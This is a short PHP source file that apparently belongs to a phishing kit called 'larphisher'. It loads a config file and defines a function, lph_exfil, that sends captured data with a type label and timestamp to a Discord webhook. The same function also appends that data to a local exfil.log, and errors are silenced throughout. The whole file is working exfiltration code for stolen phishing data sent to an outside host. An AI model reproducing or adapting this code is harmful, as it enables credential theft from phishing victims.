<?php
function lph_conf(){ static $c=null; if($c===null){$c=parse_ini_file(__DIR__.'/../config/larphisher.conf',true)?:[];} return $c; }
function lph_http($url,$data){
  if(!$url)return;
  $opt=['http'=>['method'=>'POST','timeout'=>6,'ignore_errors'=>true,'header'=>"Content-Type: application/json\r\n",'content'=>json_encode($data,JSON_UNESCAPED_UNICODE)]];
  @file_get_contents($url,false,stream_context_create($opt));
}
function lph_exfil($type,$data){
  $c=lph_conf(); $data['type']=$type; $data['ts']=date('c'); $data['by']='01png';
  $d=$c['webhook']['discord']??'';
  if($d){ 
    lph_http($d,['username'=>'larphisher','content'=>"**[ $type ]**\n```json\n".json_encode($data,JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE)."\n```"]); 
  }
  @file_put_contents(__DIR__.'/../auth/exfil.log','['.date('c')."] {$type} ".json_encode($data,JSON_UNESCAPED_UNICODE)."\n",FILE_APPEND);
}
